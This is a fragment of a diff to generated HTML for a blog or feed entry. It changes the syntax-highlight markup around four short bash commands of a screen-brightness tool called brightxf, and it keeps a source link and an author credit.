-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">brcur
-brwn
-brup
-brmx
-</code></pre></div><h1 id="heading-1"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>brcur
+</span></span><span style="display:flex;"><span>brwn
+</span></span><span style="display:flex;"><span>brup
+</span></span><span style="display:flex;"><span>brmx
+</span></span></code></pre></div><h1 id="heading-1"></h1>
 <p><a href="https://github.com/jb-williams/brightxf">SourceCode</a></p>
 <p><em>written &amp; compiled by: jb williams - <a href="https://twitter.com/_binford">@_binford</a> - <a href="https://github.com/jb-williams">github</a></em></p>
 ]]></content>
